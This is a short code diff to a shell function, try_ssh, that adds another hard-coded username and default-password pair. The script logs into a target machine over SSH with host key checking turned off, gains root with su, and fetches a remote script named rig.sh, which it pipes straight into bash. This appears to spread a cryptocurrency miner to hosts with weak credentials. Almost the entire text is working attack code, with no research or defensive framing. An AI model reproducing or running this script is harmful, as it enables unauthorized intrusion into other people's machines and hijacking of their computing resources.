@@ -18,6 +18,11 @@ try_ssh() {
         return
     }
 
+   sshpass -p "rjuytoew" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no Admin@$ip \
+    "echo 'rjuytoew' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
+        return
+    }
+
     sshpass -p "12345678" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no user@$ip \
     "echo '12345678' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
         return
